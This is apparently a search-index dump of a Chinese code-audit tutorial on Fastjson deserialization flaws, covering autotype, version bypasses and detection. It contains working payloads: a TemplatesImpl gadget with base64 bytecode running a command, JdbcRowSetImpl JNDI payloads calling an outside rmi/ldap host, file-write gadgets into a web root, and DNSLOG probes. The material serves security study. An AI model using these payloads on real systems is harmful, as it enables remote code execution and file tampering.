\u4f1a\u6765\u5230\u8fd9\u91cc\uff0cVulAutoCloseable\u7684\u7c7b\u5bf9\u8c61\u88ab\u8fd4\u56de \u7136\u540e\u4f1a\u5bf9\u8fd9\u4e2a\u7c7b\u5bf9\u8c61\u8fdb\u884c\u6821\u9a8c\uff0c\u6821\u9a8c\u662f\u5426\u4e3aClassLoader\u3001DataSource\u3001RowSet\u7b49\u7c7b\u7684\u5b50\u7c7b\uff0c\u662f\u7684\u8bdd\u76f4\u63a5\u629b\u51fa\u5f02\u5e38\uff0c\u8fd9\u4e5f\u662f\u8fc7\u6ee4\u5927\u591a\u6570JNDI\u6ce8\u5165Gadget\u7684\u673a\u5236\uff1a \u7136\u540e\u5224\u65adclazz\u662f\u5426\u662fexceptClass\u7684\u5b50\u7c7b\uff0c\u662f\u7684\u8bdd\u5c31\u76f4\u63a5\u8fd4\u56de\u7c7b\u5bf9\u8c61\u3002\u7c7b\u5bf9\u8c61\u88ab\u8fd4\u56de\u540e\uff0c\u5c31\u4f1a\u8fdb\u5165\u88ab\u53cd\u5e8f\u5217\u5316\u7684\u4e0b\u4e00\u4e2a\u8fc7\u7a0b\uff0c\u5b83\u7684\u6784\u9020\u65b9\u6cd5\u7b49\u4f1a\u88ab\u8c03\u7528\uff0c\u4ece\u800c\u5b8c\u6210\u5229\u7528\u3002 \u5b9e\u6218Gadget \u5b9e\u6218\u4e2d\u7528\u7684payload: \u6587\u4ef6\u79fb\u52a8\uff1a\u5c06\u4e00\u4e2a\u6587\u4ef6\u4e2d\u7684\u5185\u5bb9\u79fb\u52a8\u5230\u65b0\u7684\u4e00\u4e2a\u6587\u4ef6\u4e2d\u53bb\uff0c\u539f\u6765\u6587\u4ef6\u7684\u5185\u5bb9\u6d88\u5931\u3002 <dependency> <groupId>org.aspectj</groupId> <artifactId>aspectjtools</artifactId> <version>1.9.5</version></dependency> {\"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.eclipse.core.internal.localstore.SafeFileOutputStream\", \"tempPath\":\"D:/b.txt\", \"targetPath\":\"E:/b.txt\"} \u6587\u4ef6\u5199\u5165 <dependency> <groupId>com.sleepycat</groupId> <artifactId>je</artifactId> <version>5.0.73</version> </dependency> <dependency> <groupId>com.esotericsoftware</groupId> <artifactId>kryo</artifactId> <version>4.0.0</version> </dependency> <dependency> <groupId>org.aspectj</groupId> <artifactId>aspectjtools</artifactId> <version>1.9.5</version> </dependency> { \"stream\": { \"@type\": \"java.lang.AutoCloseable\", \"@type\": \"org.eclipse.core.internal.localstore.SafeFileOutputStream\", \"targetPath\": \"D:/wamp64/www/hacked.txt\", \\\\\u521b\u5efa\u4e00\u4e2a\u7a7a\u6587\u4ef6 \"tempPath\": \"D:/wamp64/www/test.txt\"\\\\\u521b\u5efa\u4e00\u4e2a\u6709\u5185\u5bb9\u7684\u6587\u4ef6 }, \"writer\": { \"@type\": \"java.lang.AutoCloseable\", \"@type\": \"com.esotericsoftware.kryo.io.Output\", \"buffer\": \"cHduZWQ=\", \\\\base64\u540e\u7684\u6587\u4ef6\u5185\u5bb9 \"outputStream\": { \"$ref\": \"$.stream\" }, \"position\": 5 }, \"close\": { \"@type\": \"java.lang.AutoCloseable\", \"@type\": \"com.sleepycat.bind.serial.SerialOutput\", \"out\": { \"$ref\": \"$.writer\" } } } \u6f0f\u6d1e\u68c0\u6d4b DNSLOG {\"@type\":\"java.net.InetAddress\",\"val\":\"dnslog.cn\"} \u572849\u4ee5\u4e0b\u624d\u80fd\u89e6\u53d1\uff0c\u56e0\u4e3a\u8fd9\u4e2agadget\u572849\u88ab\u7981\u6b62\u4e86\uff0c\u53ef\u7528\u4e8e\u68c0\u6d4b\u5177\u4f53\u7248\u672c {\"@type\":\"java.net.Inet4Address\",\"val\":\"dnslog\"} {\"@type\":\"java.net.Inet6Address\",\"val\":\"dnslog\"} {\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"dnslog\"}} {\"@type\":\"com.alibaba.fastjson.JSONObject\", {\"@type\": \"java.net.URL\", \"val\":\"dnslog\"}}\"\"} {{\"@type\":\"java.net.URL\",\"val\":\"dnslog\"}:\"aaa\"} Set[{\"@type\":\"java.net.URL\",\"val\":\"dnslog\"}] Set[{\"@type\":\"java.net.URL\",\"val\":\"dnslog\"} {{\"@type\":\"java.net.URL\",\"val\":\"dnslog\"}:0 \u62a5\u9519\u68c0\u6d4b \u8fd0\u6c14\u597d\u53ef\u4ee5\u76f4\u63a5\u51fa\u7248\u672c\u53f7 {\"xxx\":\"\\x+(eyJhIjoiXHgaGiJ9\u7684base64\u89e3\u7801) \u572860\u4ee5\u4e0b\u624d\u80fd\u89e6\u53d1\uff0c\u5f53\u540e\u7aef Fastjson \u7248\u672c\u5c0f\u4e8e 1.2.60 \u65f6\uff0c\u4f7f\u7528\u8be5\u8bf7\u6c42\u5305\u4e0d\u4f1a\u5ef6\u65f6\u4e0d\u4f1a\u62a5\u9519\uff0c\u53cd\u4e4b\u5219\u4f1a\u5ef6\u8fdf\u6216\u62a5\u9519 \u7ed5\u8fc7\u5f02\u5e38 \u6709\u4e9b\u5f00\u53d1\u4eba\u5458\u5728\u5199\u89e3\u6790JSON\u7684\u76f8\u5173\u4ee3\u7801\u65f6\uff0c\u53ef\u80fd\u4f1a\u8bbe\u7f6e\u53ea\u80fd\u4f20\u5165\u6307\u5b9a\u5bf9\u8c61\u3002 \u800c\u6211\u4eec\u901a\u8fc7\u8bbe\u7f6e@type\u65f6\u4f20\u5165\u7684\u5bf9\u8c61\u53ef\u80fd\u4f1a\u4e0e\u6307\u5b9a\u5bf9\u8c61\u4e0d\u5339\u914d\u4ece\u800c\u53d1\u751ftype not match\u7684\u5f02\u5e38\u3002 \u89e3\u51b3\u529e\u6cd5\u662f\u8fd9\u6837,\u6700\u5916\u5c42\u5957\u5c42\u5bf9\u8c61 { \"xxx\": {\"@type\":\"java.net.InetAddress\",\"val\":\"dnslog\"} } \u5ba1\u8ba1\u5173\u952e\u5b57 JSON.parseObject( \u53c2\u8003 https://c014.cn/pdfs/java/Fastjson/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html https://www.freebuf.com/vuls/228099.html https://aluvion.gitee.io/2020/08/23/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6%E5%92%8Cautotype%E8%A7%82%E6%B5%8B/#1-2-25-lt-Fastjson-lt-1-2-41-checkAutoType-%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87 https://paper.seebug.org/1192/#1225 https://www.mi1k7ea.com/2019/11/11/Fastjson%E7%B3%BB%E5%88%97%E5%9B%9B%E2%80%94%E2%80%941-2-25-1-2-47%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88%E6%97%A0%E9%9C%80%E5%BC%80%E5%90%AFAutoType%EF%BC%89/#%E4%B8%8D%E5%8F%97AutoTypeSupport%E5%BD%B1%E5%93%8D%E7%9A%84%E7%89%88%E6%9C%AC https://www.mi1k7ea.com/2021/02/08/Fastjson%E7%B3%BB%E5%88%97%E5%85%AD%E2%80%94%E2%80%941-2-48-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#0x04-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88expectClass%E7%BB%95%E8%BF%87AutoType%EF%BC%89","title":"\u6d45\u6790FastJSON\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#fastjson","text":"","title":"\u6d45\u6790FastJSON\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#_1","text":"FastJSON \u7b80\u4ecb FASTJSON\u548b\u7528 FASTJSON \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u8d77\u6e90 \u5404\u7248\u672c\u590d\u73b0 1.2.24 TemplatesImpl JdbcRowSetImpl 1.2.25 \u66f4\u65b0\u673a\u5236 bypass 1\uff08L;\u6cd5\uff091.2.25-1.2.41 bypass 2\uff08json\u5185\u7f6e\uff091.2.25-1.2.47 1.2.42 \u66f4\u65b0\u673a\u5236 bypass\uff08\u53cc\u5199\u7ed5\u8fc7\uff09 1.2.42 \u66f4\u65b0\u673a\u5236 Bypass 1.2.44 \u66f4\u65b0\u673a\u5236 Bypass 1.2.47-67 \u66f4\u65b0\u673a\u5236 1.2.68 Bypass expectClass\u7ed5\u8fc7AutoType <=1.2.68 \u8c03\u8bd5 \u5b9e\u6218Gadget \u6f0f\u6d1e\u68c0\u6d4b DNSLOG \u62a5\u9519\u68c0\u6d4b \u7ed5\u8fc7\u5f02\u5e38 \u5ba1\u8ba1\u5173\u952e\u5b57 \u53c2\u8003","title":"\u76ee\u5f55"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#fastjson_1","text":"FastJson \u662f\u4e00\u4e2a\u7531\u963f\u91cc\u5df4\u5df4\u7814\u53d1\u7684java\u5e93\uff0c\u53ef\u4ee5\u628ajava\u5bf9\u8c61\u8f6c\u6362\u4e3aJSON\u683c\u5f0f\uff0c\u4e5f\u53ef\u4ee5\u628aJSON\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u5bf9\u8c61\u3002 https://github.com/alibaba/fastjson \ud83d\udc48\u9879\u76ee\u5730\u5740 \u201c\u81ea2017\u5e743\u670815\u65e5\uff0cfastjson\u5b98\u65b9\u4e3b\u52a8\u7206\u51fa\u5176\u5728 1.2.24 \u53ca\u4e4b\u524d\u7248\u672c\u5b58\u5728\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u9ad8\u5371\u5b89\u5168\u6f0f\u6d1e\u4ee5\u6765\uff0c\u5404\u79cd\u65b0\u578b\u7ed5\u8fc7\u59ff\u52bf\u5c42\u51fa\u4e0d\u7a77\u3002\u201c\u2014\u2014c014","title":"FastJSON \u7b80\u4ecb"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#fastjson_2","text":"\u7b54\u6848\uff1a\u76f4\u63a5POM\u5bfc\u5165\uff0c\u65b9\u4fbf\u5730\u4e00\u6279 <dependencies> <dependency> <groupId>com.alibaba</groupId> <artifactId>fastjson</artifactId> <version>x.x.xx</version> </dependency> </dependencies> import com.alibaba.fastjson.JSON fastjson\u6709\u4e24\u79cd\u5e38\u89c1\u7684\u5904\u7406JSON\u7684\u65b9\u6cd5 JSON.toJSONString() \u65b9\u6cd5\uff1a\u53ef\u5c06\u5bf9\u8c61\u8f6c\u6362\u6210 JSON \u5b57\u7b26\u4e32 JSON.parseObject() \u65b9\u6cd5\uff1a\u5c06 JSON \u5b57\u7b26\u4e32\u8f6c\u6362\u6210\u5bf9\u8c61\u3002 \u4e0b\u9762\u770b\u4e00\u6ce2\u5b9e\u4f8b\uff1a\u521b\u5efa\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5c06\u5176\u8f6c\u4e3aJSON\uff0c\u7136\u540e\u518d\u8f6c\u56de\u5bf9\u8c61\u3002 \u540c\u65f6\u53ef\u4ee5\u53d1\u73b0\uff0c\u5728JSON\u5e8f\u5217\u5316\u65f6\uff0c\u4f1a\u8c03\u7528\u7c7b\u7684getxxx\u65b9\u6cd5\uff1b\u5728JSON\u53cd\u5e8f\u5217\u5316\u65f6\uff0c\u4f1a\u8c03\u7528\u7c7b\u7684\u6784\u9020\u65b9\u6cd5 public class App { public static class User{ private String id; User(){ System.out.println(\"User go\"); } public void setId(String ids){ System.out.println(\"setId go\"); this.id=ids; } public String getId(){ System.out.println(\"GetId go\"); return this.id; } } public static void main(String[] args){ User a = new User(); String json = JSON.toJSONString(a); System.out.println(json); System.out.println(JSON.parseObject(json,User.class)); } } User go GetId go {} User go org.example.App$User@36d4b5c","title":"FASTJSON\u548b\u7528"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#fastjson_3","text":"\u6211\u4eec\u53ef\u4ee5\u770b\u5230\uff0c\u628aJSON\u53cd\u5e8f\u5217\u5316\u7684\u8bed\u53e5\u662f JSON.parseObject(json,User.class)\uff0c\u5728\u6307\u5b9aJSON\u65f6\uff0c\u8fd8\u9700\u8981\u6307\u5b9a\u5176\u6240\u5c5e\u7684\u7c7b\uff0c\u663e\u5f97\u4ee3\u7801\u5c31\u5f88\u81c3\u80bf\uff0c\u6240\u4ee5\u5f00\u53d1\u4eba\u5458\u53ef\u4ee5\u4f7f\u7528@type(autotype)\u5b57\u7b26\u6bb5\u6765\u4f7f\u5176\u4e0d\u90a3\u4e48\u81c3\u80bf\u3002 \u50cf\u4e0b\u9762\u8fd9\u6837\uff0c\u5728JSON\u901a\u8fc7\u6307\u5b9a@type\u7684\u503c\u6765\u5b9e\u73b0\u5b9a\u4f4d\u67d0\u7c7b\u3002 JSON.parseObject(\"{\\\"@type\\\":\\\"org.example.App$User\\\",\\\"id\\\":\\\"123\\\"}\") \u867d\u8bf4\u8fd9\u4e48\u505a\u5f88\u65b9\u4fbf\uff0c\u4f46\u662f\u4ee5\u8fd9\u79cd\u65b9\u6cd5\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\uff0c\u4f1a\u6267\u884c\u7c7b\u7684\u6784\u9020\u65b9\u6cd5\u548c\u5c5e\u6027\u76f8\u5173\u7684get\uff0cset\u65b9\u6cd5\u3002 public class App { public static class User{ private String id; User(){ System.out.println(\"User go\"); } public void setId(String ids){ System.out.println(\"setId go\"); this.id=ids; } public String getId(){ System.out.println(\"GetId go\"); return this.id; } } public static void main(String[] args){ System.out.println(JSON.parseObject(\"{\\\"@type\\\":\\\"org.example.App$User\\\",\\\"id\\\":\\\"123\\\"}\")); } } User go setId go GetId go {\"id\":\"123\"} \u6240\u4ee5\u5728\u8fd9\u4e2aJSON\u53cd\u5e8f\u5217\u5316\u63a5\u53e3\u5904\uff0c\u6211\u4eec\u4f20\u5165\u6076\u610f\u7684JSON\uff0c\u5c31\u53ef\u4ee5\u8c03\u7528\u4efb\u610f\u7c7b\u7684\u6784\u9020\u65b9\u6cd5\u4ee5\u53ca\u5c5e\u6027\u76f8\u5173\u7684get\uff0cset\u65b9\u6cd5\u3002 \u5982\u679c\u67d0\u7c7b\u7684\u76f8\u5173\u65b9\u6cd5\u91cc\u6709\u5371\u9669\u7684\u4ee3\u7801\uff08\u5982\u6267\u884c\u67d0\u4e2a\u547d\u4ee4\uff09\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u6784\u9020\u6076\u610fJSON\u8fbe\u5230RCE\u7684\u4f5c\u7528\u3002 \u53e6\u5916\uff0cJSON.parseObject(\"{\"@type\":\"org.example.App\\$User\",\"id\":\"123\"}\",Feature.SupportNonPublicField) \uff0c\u53ef\u4ee5\u76f4\u63a5\u4e3aprivate\u6210\u5458\u8d4b\u503c\uff08\u4e0d\u52a0Feature.SupportNonPublicField\u662f\u65e0\u6cd5\u5bf9private\u6210\u5458\u8d4b\u503c\u7684\uff09\u3002\u867d\u7136\u4f46\u662f\uff0c\u5373\u4f7f\u662fprivate\u5c5e\u6027\uff0c\u5982\u679c\u5b83\u6709getter\u6216setter\u90a3\u4e48\u5b83\u7684getter\u548csetter\u4f9d\u65e7\u4f1a\u88ab\u8c03\u7528\u3002 demo public static class User{ private String id; User(){ System.out.println(\"User go\"); } } public static void main(String[] args){ ParserConfig.getGlobalInstance().setAutoTypeSupport(true); User a = JSON.parseObject(\"{\\\"@type\\\":\\\"com.exp.Main.Main$User\\\",\\\"id\\\":\\\"123\\\"}\",User.class); System.out.println(a.id); User b = JSON.parseObject(\"{\\\"@type\\\":\\\"com.exp.Main.Main$User\\\",\\\"id\\\":\\\"123\\\"}\",User.class,Feature.SupportNonPublicField); System.out.println(b.id); } User go null User go 123","title":"FASTJSON \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u8d77\u6e90"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#_2","text":"","title":"\u5404\u7248\u672c\u590d\u73b0"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#1224","text":"","title":"1.2.24"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#templatesimpl","text":"\u662f\u7684\uff0c\u5c31\u662f7U21\u94fe\u91cc\u9762\u7684TemplatesImplcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl \u8fd9\u4e2a\u7c7b\u672c\u8eab\u5c31\u5b58\u5728\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff0c\u4f1a\u5c06\u6210\u5458\u53d8\u91cf_bytecodes\u7684\u6570\u636e\u4f5c\u4e3a\u7c7b\u7684\u5b57\u8282\u7801\u8fdb\u884cnewInsantce\u64cd\u4f5c\u4ece\u800c\u8c03\u7528\u5176\u6784\u9020\u65b9\u6cd5\u6216static\u5757\u3002\u6545\u53ef\u4ee5fastjson\u4e3a\u5951\u673a\u53bb\u8c03\u7528\u6b64\u7c7b\u3002 \u4f46\u662f\u7531\u4e8e_name \u548c_bytecodes \u662f\u79c1\u6709\u5c5e\u6027\uff0c\u6240\u4ee5\u9700\u8981FASTJSON\u53cd\u5e8f\u5217\u5316\u63a5\u53e3\u6709Feature.SupportNonPublicField\u53c2\u6570\u624d\u80fd\u5b9e\u73b0\uff0c\u5229\u7528\u6761\u4ef6\u5f88\u82db\u523b\uff0c\u4f46\u662f\u6761\u4ef6\u5141\u8bb8\u7684\u8bdd\u5c31\u5f88\u65b9\u4fbf\uff0cpayload\u6253\u8fc7\u53bb\u5c31\u5b8c\u4e8b\u3002 \u201c _tfactory\u8fd9\u4e2a\u5b57\u6bb5\u5728TemplatesImpl\u65e2\u6ca1\u6709get\u65b9\u6cd5\u4e5f\u6ca1\u6709set\u65b9\u6cd5\uff0c\u8fd9\u6ca1\u5173\u7cfb\uff0c\u6211\u4eec\u8bbe\u7f6e_tfactory\u4e3a{ },fastjson\u4f1a\u8c03\u7528\u5176\u65e0\u53c2\u6784\u9020\u51fd\u6570\u5f97_tfactory\u5bf9\u8c61\uff0c\u8fd9\u6837\u5c31\u89e3\u51b3\u4e86\u67d0\u4e9b\u7248\u672c\u4e2d\u5728defineTransletClasses()\u7528\u5230\u4f1a\u5f15\u7528_tfactory\u5c5e\u6027\u5bfc\u81f4\u5f02\u5e38\u9000\u51fa\u3002 \" payload { \"@type\" : \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\", \"_bytecodes\" : [\"yv66vgAAADQAPQoADQAcCQAdAB4IAB8KACAAIQcAIggAIwoAJAAlCgAkACYKACcAKAcAKQoACgAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwApAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQwADgAPBwAuDAAvADABAAVQd25lZAcAMQwAMgAzAQAQamF2YS9sYW5nL1N0cmluZwEABGNhbGMHADQMADUANgwANwA4BwA5DAA6ADsBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAA8AA8BABJ0ZXN0X2Zhc3Rqc29uL0V2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA2VycgEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEAB3dhaXRGb3IBAAMoKUkBAA9wcmludFN0YWNrVHJhY2UAIQAMAA0AAAAAAAQAAQAOAA8AAQAQAAAAHQABAAEAAAAFKrcAAbEAAAABABEAAAAGAAEAAAAJAAEAEgATAAIAEAAAABkAAAADAAAAAbEAAAABABEAAAAGAAEAAAAXABQAAAAEAAEAFQABABIAFgACABAAAAAZAAAABAAAAAGxAAAAAQARAAAABgABAAAAHAAUAAAABAABABUACAAXAA8AAQAQAAAAawAEAAEAAAAmsgACEgO2AAQEvQAFWQMSBlNLuAAHKrYACLYACVenAAhLKrYAC7EAAQAIAB0AIAAKAAIAEQAAAB4ABwAAAAsACAANABIADgAdABEAIAAPACEAEAAlABIAGAAAAAcAAmAHABkEAAEAGgAAAAIAGw\"], \"_name\" : \"a\", \"_tfactory\" : {}, \"outputProperties\" : {} } _bytecodes\u7684\u7c7b\u957f\u8fd9\u6837,\u7f16\u8bd1\u751f\u6210Evil.class\uff0c\u5c06\u5b57\u8282\u7801\u8bfb\u51fa\u5e76\u7528base64\u52a0\u5bc6\uff0c\u4f5c\u4e3a_bytecodes import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; public class Evil extends AbstractTranslet{ static { System.err.println(\"Pwned\"); try { String[] cmd = {\"calc\"}; java.lang.Runtime.getRuntime().exec(cmd).waitFor(); } catch ( Exception e ) { e.printStackTrace(); } } @Override public void transform(DOM arg0, SerializationHandler[] arg1) throws TransletException { // anything } @Override public void transform(DOM arg0, DTMAxisIterator arg1, SerializationHandler arg2) throws TransletException { // anything } }","title":"TemplatesImpl"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#jdbcrowsetimpl","text":"com.sun.rowset.JdbcRowSetImpl ,\u901a\u8fc7JNDI\u6ce8\u5165\u6765\u5b9e\u73b0RCE\u3002\u4f46\u9700\u6ce8\u610fJNDI\u6ce8\u5165\u6709JDK\u7248\u672c\u9650\u5236\uff0c\u9ad8\u7248\u672c\u9700\u8981\u8fdb\u884c\u7ed5\u8fc7\u3002 \u6211\u4eec\u7684payload\u4e00\u822c\u957f\u8fd9\u6837 {\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi:/ip:port/Exploit\",\"autoCommit\":true} or {\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://ip:1099/exp\",\"autoCommit\":true} \u628a\u8fd9\u4e2apayload\u6253\u8fc7\u53bb\uff0c\u4f1a\u6267\u884csetAutoCommit()\uff0c\u53c8setAutoCommit()\u6267\u884c\u4e86connct()\u51fd\u6570\uff0c\u5176\u5982\u4e0b\u3002 connect()\u4f1a\u5bf9dataSourceName\u5c5e\u6027\u8fdb\u884c\u4e00\u4e2aInitialContext.lookup(dataSourceName),\u4ece\u800c\u5b9e\u73b0JNDI\u6ce8\u5165\u3002 private Connection connect() throws SQLException { if(this.conn != null) { return this.conn; } else if(this.getDataSourceName() != null) { try { InitialContext var1 = new InitialContext(); DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName()); return this.getUsername() != null && !this.getUsername().equals(\"\")?var2.getConnection(this.getUsername(), this.getPassword()):var2.getConnection(); } catch (NamingException var3) { throw new SQLException(this.resBundle.handleGetObject(\"jdbcrowsetimpl.connect\").toString()); } } else { return this.getUrl() != null?DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()):null; } 